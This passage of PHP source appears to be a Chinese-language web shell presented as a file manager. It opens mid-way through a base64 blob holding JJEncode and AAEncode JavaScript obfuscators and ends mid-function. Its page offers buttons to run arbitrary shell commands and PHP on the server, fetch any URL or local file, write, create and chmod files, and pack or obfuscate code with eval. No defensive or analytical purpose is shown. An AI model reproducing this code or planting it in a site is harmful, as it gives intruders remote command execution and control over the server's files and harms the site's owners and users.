cnRfZGVsaW0gPSBmYWxzZTsNCn0NCn0NCmlmIChzdGFydF9kZWxpbSkgew0KcHJpbnRfc3BhY2UoKTsNCn0NCnByaW50X3Rva2VuKCk7DQppZiAoZW5kX2RlbGltKSB7DQpwcmludF9zcGFjZSgpOw0KfQ0KYnJlYWs7DQpjYXNlICdUS19CTE9DS19DT01NRU5UJzoNCnByaW50X25ld2xpbmUoKTsNCnByaW50X3Rva2VuKCk7DQpwcmludF9uZXdsaW5lKCk7DQpicmVhazsNCmNhc2UgJ1RLX0NPTU1FTlQnOg0KcHJpbnRfc3BhY2UoKTsNCnByaW50X3Rva2VuKCk7DQpwcmludF9uZXdsaW5lKCk7DQpicmVhazsNCmNhc2UgJ1RLX1VOS05PV04nOg0KcHJpbnRfdG9rZW4oKTsNCmJyZWFrOw0KfQ0KbGFzdF90eXBlID0gdG9rZW5fdHlwZTsNCmxhc3RfdGV4dCA9IHRva2VuX3RleHQ7DQp9DQpyZXR1cm4gb3V0cHV0LmpvaW4oJycpOw0KfQ0KdmFyIGtleWxpbmUgPSAxOw0KdmFyIHRpbWVtcyA9IHRydWU7DQpmdW5jdGlvbiAkKGUpDQp7DQpyZXR1cm4gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoZSk7DQp9DQpmdW5jdGlvbiBnZXRDb3VudChzdHIxLHN0cjIpDQp7DQpyZXR1cm4gc3RyMS5tYXRjaCgvXHN0cjIvZ2kpLmxlbmd0aDsNCn0NCmZ1bmN0aW9uIGpqZW5jb2RlKGd2LHRleHQpe3ZhciByPSIiO3ZhciBuO3ZhciB0O3ZhciBiPVsiX19fIiwiX18kIiwiXyRfIiwiXyQkIiwiJF9fIiwiJF8kIiwiJCRfIiwiJCQkIiwiJF9fXyIsIiRfXyQiLCIkXyRfIiwiJF8kJCIsIiQkX18iLCIkJF8kIiwiJCQkXyIsIiQkJCQiLF07dmFyIHM9IiI7Zm9yKHZhciBpPTA7aTx0ZXh0Lmxlbmd0aDtpKyspe249dGV4dC5jaGFyQ29kZUF0KGkpO2lmKG49PTB4MjJ8fG49PTB4NWMpe3MrPSJcXFxcXFwiK3RleHQuY2hhckF0KGkpLnRvU3RyaW5nKDE2KX1lbHNlIGlmKCgweDIwPD1uJiZuPD0weDJmKXx8KDB4M0E8PW49PTB4NDApfHwoMHg1Yjw9biYmbjw9MHg2MCl8fCgweDdiPD1uJiZuPD0weDdmKSl7cys9dGV4dC5jaGFyQXQoaSl9ZWxzZSBpZigoMHgzMDw9biYmbjw9MHgzOSl8fCgweDYxPD1uJiZuPD0weDY2KSl7aWYocylyKz0iXCIiK3MrIlwiKyI7cis9Z3YrIi4iK2JbbjwweDQwP24tMHgzMDpuLTB4NTddKyIrIjtzPSIifWVsc2UgaWYobj09MHg2Yyl7aWYocylyKz0iXCIiK3MrIlwiKyI7cis9IighW10rXCJcIilbIitndisiLl8kX10rIjtzPSIifWVsc2UgaWYobj09MHg2Zil7aWYocylyKz0iXCIiK3MrIlwiKyI7cis9Z3YrIi5fJCsiO3M9IiJ9ZWxzZSBpZihuPT0weDc0KXtpZihzKXIrPSJcIiIrcysiXCIrIjtyKz1ndisiLl9fKyI7cz0iIn1lbHNlIGlmKG49PTB4NzUpe2lmKHMpcis9IlwiIitzKyJcIisiO3IrPWd2KyIuXysiO3M9IiJ9ZWxzZSBpZihuPDEyOCl7aWYocylyKz0iXCIiK3M7ZWxzZSByKz0iXCIiO3IrPSJcXFxcXCIrIituLnRvU3RyaW5nKDgpLnJlcGxhY2UoL1swLTddL2csZnVuY3Rpb24oYyl7cmV0dXJuIGd2KyIuIitiW2NdKyIrIn0pO3M9IiJ9ZWxzZXtpZihzKXIrPSJcIiIrcztlbHNlIHIrPSJcIiI7cis9IlxcXFxcIisiK2d2KyIuXysiK24udG9TdHJpbmcoMTYpLnJlcGxhY2UoL1swLTlhLWZdL2dpLGZ1bmN0aW9uKGMpe3JldHVybiBndisiLiIrYltwYXJzZUludChjLDE2KV0rIisifSk7cz0iIn19aWYocylyKz0iXCIiK3MrIlwiKyI7cj1ndisiPX5bXTsiK2d2KyI9e19fXzorKyIrZ3YrIiwkJCQkOighW10rXCJcIilbIitndisiXSxfXyQ6KysiK2d2KyIsJF8kXzooIVtdK1wiXCIpWyIrZ3YrIl0sXyRfOisrIitndisiLCRfJCQ6KHt9K1wiXCIpWyIrZ3YrIl0sJCRfJDooIitndisiWyIrZ3YrIl0rXCJcIilbIitndisiXSxfJCQ6KysiK2d2KyIsJCQkXzooIVwiXCIrXCJcIilbIitndisiXSwkX186KysiK2d2KyIsJF8kOisrIitndisiLCQkX186KHt9K1wiXCIpWyIrZ3YrIl0sJCRfOisrIitndisiLCQkJDorKyIrZ3YrIiwkX19fOisrIitndisiLCRfXyQ6KysiK2d2KyJ9OyIrZ3YrIi4kXz0oIitndisiLiRfPSIrZ3YrIitcIlwiKVsiK2d2KyIuJF8kXSsoIitndisiLl8kPSIrZ3YrIi4kX1siK2d2KyIuX18kXSkrKCIrZ3YrIi4kJD0oIitndisiLiQrXCJcIilbIitndisiLl9fJF0pKygoISIrZ3YrIikrXCJcIilbIitndisiLl8kJF0rKCIrZ3YrIi5fXz0iK2d2KyIuJF9bIitndisiLiQkX10pKygiK2d2KyIuJD0oIVwiXCIrXCJcIilbIitndisiLl9fJF0pKygiK2d2KyIuXz0oIVwiXCIrXCJcIilbIitndisiLl8kX10pKyIrZ3YrIi4kX1siK2d2KyIuJF8kXSsiK2d2KyIuX18rIitndisiLl8kKyIrZ3YrIi4kOyIrZ3YrIi4kJD0iK2d2KyIuJCsoIVwiXCIrXCJcIilbIitndisiLl8kJF0rIitndisiLl9fKyIrZ3YrIi5fKyIrZ3YrIi4kKyIrZ3YrIi4kJDsiK2d2KyIuJD0oIitndisiLl9fXylbIitndisiLiRfXVsiK2d2KyIuJF9dOyIrZ3YrIi4kKCIrZ3YrIi4kKCIrZ3YrIi4kJCtcIlxcXCJcIisiK3IrIlwiXFxcIlwiKSgpKSgpOyI7cmV0dXJuIHJ9DQpmdW5jdGlvbiBhYWVuY29kZSh0ZXh0KXt2YXIgdDt2YXIgYj1bIihjXl9ebykiLCIo776fzpjvvp8pIiwiKChvXl9ebykgLSAo776fzpjvvp8pKSIsIihvXl9ebykiLCIo776f772w776fKSIsIigo776f772w776fKSArICjvvp/OmO++nykpIiwiKChvXl9ebykgKyhvXl9ebykpIiwiKCjvvp/vvbDvvp8pICsgKG9eX15vKSkiLCIoKO++n++9sO++nykgKyAo776f772w776fKSkiLCIoKO++n++9sO++nykgKyAo776f772w776fKSArICjvvp/OmO++nykpIiwiKO++n9CU776fKSAu776fz4nvvp/vvokiLCIo776f0JTvvp8pIC7vvp/OmO++n+++iSIsIijvvp/QlO++nykgWydjJ10iLCIo776f0JTvvp8pIC7vvp/vvbDvvp/vvokiLCIo776f0JTvvp8pIC7vvp/QlO++n+++iSIsIijvvp/QlO++nykgW+++n86Y776fXSJdO3ZhciByPSLvvp/Pie++n+++iT0gL++9gO+9jcK077yJ776JIH7ilLvilIHilLsgICAvLyrCtOKIh++9gCovIFsnXyddOyBvPSjvvp/vvbDvvp8pICA9Xz0zOyBjPSjvvp/OmO++nykgPSjvvp/vvbDvvp8pLSjvvp/vvbDvvp8pOyAiO2lmKC/jgbLjgaDjgb7jgorjgrnjgrHjg4Pjg4HDlygzNjV877yT77yV77yWKVxzKuadpemAseOCguimi+OBpuOBj+OBoOOBleOBhOOBrVsh77yBXS8udGVzdCh0ZXh0KSl7cis9Ilg9Xz0zOyAiO3IrPSJcclxuXHJcbiAgICBYIC8gXyAvIFggPCBcIuadpemAseOCguimi+OBpuOBj+OBoOOBleOBhOOBrSFcIjtcclxuXHJcbiJ9cis9Iijvvp/QlO++nykgPSjvvp/OmO++nyk9IChvXl9ebykvIChvXl9ebyk7KO++n9CU776fKT17776fzpjvvp86ICdfJyAs776fz4nvvp/vvokgOiAoKO++n8+J776f776JPT0zKSArJ18nKSBb776fzpjvvp9dICzvvp/vvbDvvp/vvokgOijvvp/Pie++n+++iSsgJ18nKVtvXl9ebyAtKO++n86Y776fKV0gLO++n9CU776f776JOigo776f772w776fPT0zKSArJ18nKVvvvp/vvbDvvp9dIH07ICjvvp/QlO++nykgW+++n86Y776fXSA9KCjvvp/Pie++n+++iT09MykgKydfJykgW2NeX15vXTso776f0JTvvp8pIFsnYyddID0gKCjvvp/QlO++nykrJ18nKSBbICjvvp/vvbDvvp8pKyjvvp/vvbDvvp8pLSjvvp/OmO++nykgXTso776f0JTvvp8pIFsnbyddID0gKCjvvp/QlO++nykrJ18nKSBb776fzpjvvp9dOyjvvp9v776fKT0o776f0JTvvp8pIFsnYyddKyjvvp/QlO++nykgWydvJ10rKO++n8+J776f776JICsnXycpW+++n86Y776fXSsgKCjvvp/Pie++n+++iT09MykgKydfJykgW+++n++9sO++n10gKyAoKO++n9CU776fKSArJ18nKSBbKO++n++9sO++nykrKO++n++9sO++nyldKyAoKO++n++9sO++nz09MykgKydfJykgW+++n86Y776fXSsoKO++n++9sO++nz09MykgKydfJykgWyjvvp/vvbDvvp8pIC0gKO++n86Y776fKV0rKO++n9CU776fKSBbJ2MnXSsoKO++n9CU776fKSsnXycpIFso776f772w776fKSso776f772w776fKV0rICjvvp/QlO++nykgWydvJ10rKCjvvp/vvbDvvp89PTMpICsnXycpIFvvvp/OmO++n107KO++n9CU776fKSBbJ18nXSA9KG9eX15vKSBb776fb+++n10gW+++n2/vvp9dOyjvvp/Ote++nyk9KCjvvp/vvbDvvp89PTMpICsnXycpIFvvvp/OmO++n10rICjvvp/QlO++nykgLu++n9CU776f776JKygo776f0JTvvp8pKydfJykgWyjvvp/vvbDvvp8pICsgKO++n++9sO++nyldKygo776f772w776fPT0zKSArJ18nKSBbb15fXm8gLe++n86Y776fXSsoKO++n++9sO++nz09MykgKydfJykgW+++n86Y776fXSsgKO++n8+J776f776JICsnXycpIFvvvp/OmO++n107ICjvvp/vvbDvvp8pKz0o776fzpjvvp8pOyAo776f0JTvvp8pW+++n861776fXT0nXFxcXCc7ICjvvp/QlO++nyku776fzpjvvp/vvok9KO++n9CU776fKyDvvp/vvbDvvp8pW29eX15vIC0o776fzpjvvp8pXTsob+++n++9sO++n28pPSjvvp/Pie++n+++iSArJ18nKVtjXl9eb107KO++n9CU776fKSBb776fb+++n109J1xcXCInOyjvvp/QlO++nykgWydfJ10gKCAo776f0JTvvp8pIFsnXyddICjvvp/Ote++nysiO3IrPSIo776f0JTvvp8pW+++n2/vvp9dKyAiO2Zvcih2YXIgaT0wO2k8dGV4dC5sZW5ndGg7aSsrKXtuPXRleHQuY2hhckNvZGVBdChpKTt0PSIo776f0JTvvp8pW+++n861776fXSsiO2lmKG48PTEyNyl7dCs9bi50b1N0cmluZyg4KS5yZXBsYWNlKC9bMC03XS9nLGZ1bmN0aW9uKGMpe3JldHVybiBiW2NdKyIrICJ9KX1lbHNle3ZhciBtPS9bMC05YS1mXXs0fSQvLmV4ZWMoIjAwMCIrbi50b1N0cmluZygxNikpWzBdO3QrPSIob+++n++9sO++n28pKyAiK20ucmVwbGFjZSgvWzAtOWEtZl0vZ2ksZnVuY3Rpb24oYyl7cmV0dXJuIGJbcGFyc2VJbnQoYywxNildKyIrICJ9KX1yKz10fXIrPSIo776f0JTvvp8pW+++n2/vvp9dKSAo776fzpjvvp8pKSAoJ18nKTsiO3JldHVybiByfQ==");
    echo "
	$('runbox').value=$('runbox').value.replace(/\%\<\ \/\ text\%/ig,'</text');
	var b = new Base64();
	function runCode() {
	var ee=document.getElementById('runbox').value;
					if (ee) {
						var winname = window.open('', '_blank', '');
						winname.document.open('text/html', 'replace');
						winname.opener = null;
						winname.document.write(ee);
						winname.document.close();
					}
					
				}
	function jsCode() {
	var ee=document.getElementById('runbox').value;
					if (ee) {
						var winname = window.open('', '_blank', '');
						winname.document.open('text/html', 'replace');
						winname.opener = null;
						winname.document.write('<script>' + ee + '<\/' + 'script>');
						winname.document.close();
					}
					
				}
				function phpCode() {
					var ee=document.getElementById('runbox').value;
					if (ee) {
						document.getElementById('phpcode').value = b.encode(ee.replace(/\<\?php/ig,'').replace(/\<\?/ig,'').replace(/\?>/ig,''));
						//document.getElementById('phpcode').value = b.encode(ee);
						document.getElementById('php').submit();
					}
				}
				function sshCode() {
					var ee=document.getElementById('runbox').value;
					if (ee) {
						document.getElementById('sshcode').value = b.encode(ee);
						document.getElementById('ssh').submit();
					}
				}
				function loadXMLDoc(url, id,gp,data) {
					xmlhttp = null;
					if (window.XMLHttpRequest) { // code for IE7, Firefox, Opera, etc.
						xmlhttp = new XMLHttpRequest();
					} else if (window.ActiveXObject) { // code for IE6, IE5
						xmlhttp = new ActiveXObject(\"Microsoft.XMLHTTP\");
					}
					if (xmlhttp != null) {
						xmlhttp.onreadystatechange = function() {
					if (xmlhttp.readyState == 4) { 
						if (xmlhttp.status == 200) { 
							$('runbox').value=(xmlhttp.responseText);
							gls(1);
							alert('操作成功！');
						} else {
							alert('Problem retrieving XML data:' + xmlhttp.statusText);
						}
					}
				}
						xmlhttp.open(gp, url, true);
						xmlhttp.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); 
						xmlhttp.send(data);
					} else {
						alert('Your browser does not support XMLHTTP.');
					}
				}
				function FormatCode() {

	var js_source = $('runbox').value.replace(/^\s+/, '');
	var tabsize = $('tabsize') ? $('tabsize').value : 1;
	var tabchar = ' ';
	if (tabsize == 1) {
		tabchar = '\t';
	}
	if (js_source && js_source.charAt(0) === '<')
	{
		$('runbox').value = style_html(js_source, tabsize, tabchar, 80);
	} else
	{
		$('runbox').value = js_beautify(js_source, tabsize, tabchar);
	}
	
	return false;
}



function pack_js(base64) {
	var input = $('runbox').value;
	var packer = new Packer;
	if (base64) {
		var output = packer.pack(input, 1, 0);
	} else {
		var output = packer.pack(input, 0, 0);
	}
	$('runbox').value = output;
}

function decode() {
  var code = $('runbox').value;
 code = code.replace('eval(', '(');
 var data=eval(code);
 
 if(data){
  $('runbox').value = data;
  }
}

function Empty() {
	$('runbox').value = '';
	$('runbox').select();
}
function GetFocus() {
	$('runbox').focus();
}	
				function getCode() {
					var ss=prompt('请输入要获取代码的网址','http://www.baidu.com/');
					if(ss){

var strUrl = window.location.href;
var regexp = /([^\?\/]+)\?/;
var result = strUrl.match(regexp);
loadXMLDoc(result[1]+'?op=gc&path='+b.encode(ss),'runbox','GET',null);
					}
				}
				function edCode(type) {
	var ss=$('runbox').value;
					if(ss){

var strUrl = window.location.href;
var regexp = /([^\?\/]+)\?/;
var result = strUrl.match(regexp);
if(type=='ejm'){ss=b.encode(ss);}
loadXMLDoc(result[1]+'?op='+type,'runbox','POST','path='+b.encode(ss));
					}
				}
				
				function downloadCode() {
					var ee=document.getElementById('runbox').value;
					if (ee) {
						document.getElementById('dfilecode').value = b.encode(ee);
						document.getElementById('dfile').submit();
					}
				}
				function gls(t){
				if(t==0){
				if($('runbox').style.display=='none'){
				$('runbox').value=window.frames['editor'].e.getValue();
				}
				}else{
				if($('runbox').style.display=='none'){
				window.frames['editor'].e.setValue($('runbox').value);
				}
				}
				}
function nativeConvertAscii() {
    var nativecode = $('runbox').value.split(\"\");
    var ascii = \"\";
    for (var i = 0; i < nativecode.length; i++) {
        var code = Number(nativecode[i].charCodeAt(0));
        if (code > 127) {
            var charAscii = code.toString(16);
            charAscii = new String(\"0000\").substring(charAscii.length, 4) + charAscii;
            ascii += \"\\\\u\" + charAscii;
        } else {
            ascii += nativecode[i];
        }
    }
    $('runbox').value = ascii;
}

function asciiConvertNative() {
    var asciicode = $('runbox').value.split(\"\\\\u\");
    var nativeValue = asciicode[0];
    for (var i = 1; i < asciicode.length; i++) {
        var code = asciicode[i];
        nativeValue += String.fromCharCode(parseInt(\"0x\" + code.substring(0, 4)));
        if (code.length > 4) {
            nativeValue += code.substring(4, code.length);
        }
    }
    $('runbox').value = nativeValue;
}				
function HTMLEncode(html)
{
var temp = document.createElement ('div');
(temp.textContent != null) ? (temp.textContent = html) : (temp.innerText = html);
var output = temp.innerHTML;
temp = null;
return output;
}
function HTMLDecode(text)
{
var temp = document.createElement('div');
temp.innerHTML = text;
var output = temp.innerText || temp.textContent;
temp = null;
return output;
}
var LittleUrl={encode:function(string){return escape(this._utf8_encode(string)).replace(/\\//ig,\"%2F\");},decode:function(string){return this._utf8_decode(unescape(string));},_utf8_encode:function(string){string=string.replace(/\/\/r\/\/n/g,\"\/\/n\");var utftext=\"\";for(var n=0;n<string.length;n++){var c=string.charCodeAt(n);if(c<128){utftext+=String.fromCharCode(c);}else if((c>127)&&(c<2048)){utftext+=String.fromCharCode((c>>6)|192);utftext+=String.fromCharCode((c&63)|128);}else{utftext+=String.fromCharCode((c>>12)|224);utftext+=String.fromCharCode(((c>>6)&63)|128);utftext+=String.fromCharCode((c&63)|128);}}return utftext;},_utf8_decode:function(utftext){var string=\"\";var i=0;var c=c1=c2=0;while(i<utftext.length){c=utftext.charCodeAt(i);if(c<128){string+=String.fromCharCode(c);i++;}else if((c>191)&&(c<224)){c2=utftext.charCodeAt(i+1);string+=String.fromCharCode(((c&31)<<6)|(c2&63));i+=2;}else{c2=utftext.charCodeAt(i+1);c3=utftext.charCodeAt(i+2);string+=String.fromCharCode(((c&15)<<12)|((c2&63)<<6)|(c3&63));i+=3;}}return string;}}
function URLEncode (clearString) {
  return LittleUrl.encode(clearString);
}
function URLDecode (encodedString) {
   return LittleUrl.decode(encodedString);
}				
	</script>" 
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);runCode();\">运行HTML</button>\n" 
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);jsCode();\">运行JS</button>\n" 
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);phpCode();\">运行PHP</button>\n" 
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);sshCode();\">运行SHELL</button>\n" 
	. "<button style=\"width:92px;height:22px\" onclick=\"getCode();\">获取代码</button>\n"

	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);downloadCode();\">下载代码</button>\n" 
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);Empty();gls(1);\">清空结果</button>\n"
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);FormatCode();gls(1);\">格式化</button>\n"		
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);pack_js(0);gls(1);\">普通压缩</button>\n"
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);$('runbox').value=aaencode($('runbox').value);gls(1);\">AAEncode</button>\n"
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);$('runbox').value=jjencode('$',$('runbox').value);gls(1);\">JJEncode</button>\n"	
	. "<button style=\"width:92px;height:22px\" onclick=\"if(document.getElementById('runbox').style.display=='none'){document.getElementById('runbox').style.display='block';document.getElementById('editor').style.display='none';document.getElementById('runbox').value=window.frames['editor'].e.getValue();this.innerHTML='高亮显示'}else{document.getElementById('runbox').style.display='none';document.getElementById('editor').style.display='block';window.frames['editor'].e.setValue(document.getElementById('runbox').value);this.innerHTML='简约显示'};return false;\">高亮显示</button>\n"	
	."<br>"

	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);pack_js(1);gls(1);\">Eval压缩</button>\n"
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);decode();gls(1);\">Eval还原</button>\n"


	
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);nativeConvertAscii();gls(1);\">Native2Ascii</button>\n"
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);asciiConvertNative();gls(1);\">Ascii2Native</button>\n"	
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);$('runbox').value=HTMLEncode($('runbox').value);gls(1);\">HTMLEncode</button>\n"
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);$('runbox').value=HTMLDecode($('runbox').value);gls(1);\">HTMLDecode</button>\n"		
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);$('runbox').value=URLEncode($('runbox').value);gls(1);\">URLEncode</button>\n"
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);$('runbox').value=URLDecode($('runbox').value);gls(1);\">URLDecode</button>\n"
    . "<button style=\"width:92px;height:22px\" onclick=\"gls(0);edCode('ejm');gls(1);\">加密代码</button>\n"
    . "<button style=\"width:92px;height:22px\" onclick=\"gls(0);edCode('djm');gls(1);\">解密代码</button>\n"		
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);$('runbox').value=b.encode($('runbox').value);gls(1);\">Base64_En</button>\n"
	. "<button style=\"width:92px;height:22px\" onclick=\"gls(0);$('runbox').value=b.decode($('runbox').value);gls(1);\">Base64_De</button>\n<br>"	;

    mainbottom();
    /*} else {
    home();
    }*/
}

function ssh($ncontent)
{
    global $folder;
    if (!$ncontent == "") {
        maintop("SSH执行结果");
        echo "SSH执行代码<br>";
        echo "&nbsp;&nbsp;".$ncontent;
        echo "<br><br>SSH执行结果<br>";
		echo "<iframe src=\"". $adminfile . "?op=shx&sshcode=".base64_encode($ncontent)."\" width=\"100%\" height=\"500px\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"auto\" allowtransparency=\"yes\"></iframe>";
        //echo "<div>" . str_replace("\n", "<br>", iconv("gbk","UTF-8//IGNORE",shell_exec($ncontent))) . "</div>";
        echo "<br><br><a href=\"javascript:history.go(-1);\">返回编辑</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n";
        mainbottom();
    } else {
        home();
    }
}

/****************************************************************/
/* function save()                                              */
/*                                                              */
/* Second step in edit.                                         */
/* Recieves $ncontent from edit() as the file content.          */
/* Recieves $fename from edit() as the file name to modify.     */
/****************************************************************/
function save($ncontent, $fename)
{
    global $folder;
    if (!$fename == "") {
        maintop("编辑");
        $loc = $folder . $fename;
        $fp  = fopen($loc, "w");
        
       /* $replace1 = "</text";
        $replace2 = "area>";
        $replace3 = "< / text";
        $replace4 = "area>";
        $replacea = $replace1 . $replace2;
        $replaceb = $replace3 . $replace4;
        $ncontent = ereg_replace($replaceb, $replacea, $ncontent);
        */
        /*$ydata = stripslashes($ncontent);*/
       //  if (file_put_contents($loc, $ncontent)) {
        if (fwrite($fp, $ncontent)) {
            echo "文件 <a href=\"" . $adminfile . "?op=viewframe&file=" . $fename . "&folder=" . $folder . "\">" . $folder . $fename . "</a> 保存成功！\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
            $fp = null;
        } else {
            echo "文件保存出错！\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        }
        mainbottom();
    } else {
        home();
    }
}

/****************************************************************/
/* function gcx()                                              */
/*                                                              */
/* First step in getcode.                                       */
/****************************************************************/
function gcx($path){
return file_get_contents($path);
}

/****************************************************************/
/* function ejx()                                              */
/*                                                              */
/* First step in jencode.                                       */
/****************************************************************/
function ejx($path){
return base64_encode(bzcompress(base64_decode($path), 9));
}

/****************************************************************/
/* function djx()                                              */
/*                                                              */
/* First step in jdecode.                                       */
/****************************************************************/
function djx($path){
return bzdecompress(base64_decode($path));
}


/****************************************************************/
/* function cr()                                                */
/*                                                              */
/* First step in create.                                        */
/* Promts the user to a filename and file/directory switch.     */
/****************************************************************/
function cr()
{
    global $folder, $content, $filefolder;
    maintop("创建");
    if (!$content == "") {
        echo "<br><br>请输入一个名称.\n";
    }
    echo "<form action=\"" . $adminfile . "?op=create\" method=\"post\">\n" . "文件名: <br><input type=\"text\" size=\"20\" name=\"nfname\" class=\"text\"><br><br>\n" . "目标:<br><select name=ndir size=1>\n" . "<option value=\"" . $filefolder . "\">" . $filefolder . "</option>";
    listdir($filefolder);
    echo $content . "</select><br><br>";
    
    
    echo "文件 <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"0\" checked><br>\n" . "目录 <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"1\"><br><br>\n" . "<input type=\"hidden\" name=\"folder\" value=\"$folder\">\n" . "<input type=\"submit\" value=\"创建\" class=\"button\">\n" . "<a href=\"" . $adminfile . "?op=home\"> 取消 </a>\n" . "</form>\n";
    mainbottom();
}


/****************************************************************/
/* function create()                                            */
/*                                                              */
/* Second step in create.                                       */
/* Creates the file/directoy on disk.                           */
/* Recieves $nfname from cr() as the filename.                  */
/* Recieves $infolder from cr() to determine file trpe.         */
/****************************************************************/
function create($nfname, $isfolder, $ndir)
{
    global $folder;
    if (!$nfname == "") {
        maintop("创建");
        
        if ($isfolder == 1) {
            if (mkdir($ndir . "/" . $nfname, 0777)) {
                echo "您的目录<a href=\"" . $adminfile . "?op=home&folder=" . $ndir . "" . $nfname . "/\">" . $ndir . "" . $nfname . "</a> 已经成功被创建.\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $ndir . "\">返回上一级目录</a>\n";
            } else {
                echo "您的目录" . $ndir . "" . $nfname . " 不能被创建. 请检查您的目录权限是否已经被设置为777\n";
            }
        } else {
            if (fopen($ndir . "/" . $nfname, "w")) {
                echo "您的文件, <a href=\"" . $adminfile . "?op=edit&fename=" . $nfname . "&folder=$ndir\">" . $ndir . $nfname . "</a> 已经成功被创建.\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $ndir . "\">返回上一级目录</a>\n";
            } else {
                echo "您的文件 " . $ndir . "/" . $nfname . " 不能被创建. 请检查您的目录权限是否已经被设置为777\n";
            }
        }
        mainbottom();
    } else {
        cr();
    }
}

function chm($file)
{
    global $folder;
    if (!$file == "") {
        maintop("设置权限");
        echo "<form action=\"" . $adminfile . "?op=chmodok\" method=\"post\">\n" . "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n" . "设置权限 " . $folder . $file;
        
        echo "</table><br>\n" . "<input type=\"hidden\" name=\"rename\" value=\"" . $file . "\">\n" . "<input type=\"hidden\" name=\"folder\" value=\"" . $folder . "\">\n" . "权限:<br><input class=\"text\" type=\"text\" size=\"20\" name=\"nchmod\">\n" . "<input type=\"Submit\" value=\"设置\" class=\"button\">\n" . "<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\"> 取消 </a>\n";
        echo "<br><br>\n" . "权限为四位数，如0777 0755 0644等\n" . "<br>\n";
        mainbottom();
    } else {
        home();
    }
}


function chmodok($rename, $nchmod, $folder)
{
    global $folder;
    if (!$rename == "") {
        maintop("重命名");
        $loc1 = "$folder" . $rename;
        $loc2 = octdec($nchmod);
        
        if (chmod($loc1, "$loc2")) {
            echo "文件 " . $folder . $rename . " 的权限已经设置为" . $nchmod . "</a>\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        } else {
            echo "设置出错！\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        }
        mainbottom();
    } else {
        home();
    }
}

/****************************************************************/
/* function ren()                                               */
/*                                                              */
/* First step in rename.                                        */
/* Promts the user for new filename.                            */
/* Globals $file and $folder for filename.                      */
/****************************************************************/
function ren($file)
{
    global $folder;
    if (!$file == "") {
        maintop("重命名");
        echo "<form action=\"" . $adminfile . "?op=rename\" method=\"post\">\n" . "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n" . "重命名 " . $folder . $file;
        
        echo "</table><br>\n" . "<input type=\"hidden\" name=\"rename\" value=\"" . $file . "\">\n" . "<input type=\"hidden\" name=\"folder\" value=\"" . $folder . "\">\n" . "新档名:<br><input class=\"text\" type=\"text\" size=\"20\" name=\"nrename\">\n" . "<input type=\"Submit\" value=\"重命名\" class=\"button\">\n" . "<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\"> 取消 </a>\n";
        mainbottom();
    } else {
        home();
    }
}


/****************************************************************/
/* function renam()                                             */
/*                                                              */
/* Second step in rename.                                       */
/* Rename the specified file.                                   */
/* Recieves $rename from ren() as the old  filename.            */
/* Recieves $nrename from ren() as the new filename.            */
/****************************************************************/
function renam($rename, $nrename, $folder)
{
    global $folder;
    if (!$rename == "") {
        maintop("重命名");
        $loc1 = "$folder" . $rename;
        $loc2 = "$folder" . $nrename;
        
        if (rename($loc1, $loc2)) {
            echo "文件 " . $folder . $rename . " 的档名已被更改成 " . $folder . $nrename . "</a>\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        } else {
            echo "重命名出错！\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        }
        mainbottom();
    } else {
        home();
    }
}


/****************************************************************/
/* function listdir()                                           */
/*                                                              */
/* Recursivly lists directories and sub-directories.            */
/* Recieves $dir as the directory to scan through.              */
/****************************************************************/
function listdir($dir, $level_count = 0)
{
    global $content;
    if (!@($thisdir = opendir($dir))) {
        return;
    }
    while ($item = readdir($thisdir)) {
        if (is_dir("$dir/$item") && (substr("$item", 0, 1) != '.')) {
            listdir("$dir/$item", $level_count + 1);
        }
    }
    if ($level_count > 0) {
        $dir = ereg_replace("[/][/]", "/", $dir);
